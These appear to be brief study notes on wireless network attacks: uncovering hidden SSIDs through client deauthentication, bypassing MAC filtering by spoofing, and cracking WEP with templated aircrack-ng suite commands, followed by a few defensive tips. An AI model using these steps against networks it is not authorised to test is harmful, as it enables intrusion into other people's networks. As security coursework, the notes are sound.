## Hidden Networks
Does not broadcast ESSID(name); only channel and BSSID
cannot connect to or crack password

To view the name, 
- perform airodump-ng on the wifi 
- deauth a client for a little while
You should see the name of the network in the airodump-ng ouput

## Bypassing Mac Filtering
Blacklist: allow all MACs to connect except the ones on the list.
Whitelst: allow all MACs on the list.

Blacklist can be bypass by randonmizing your mac addresses

To bypass Whitelist
- run packet capture
- pick your access point and perform packet capture
- change your mac address to that of a client shown in your airodump-ng

## Cracking SKA WEP
`airodump-ng --bssid <access-point-mac-address> --channel <access-point-channel> --write /path/to/file <interface-name>`

`aireplay-ng --arpreplay -b <access-point-mac-address> -h <client-mac-address> <interface-name>`

`aircrack-ng /path/to/airodump/file `

## Securing your networks
- Use 802.11w to detect and prevent deauth attacks
- do not use mac filtering on access control
- use WPA/WPA2 Enterprise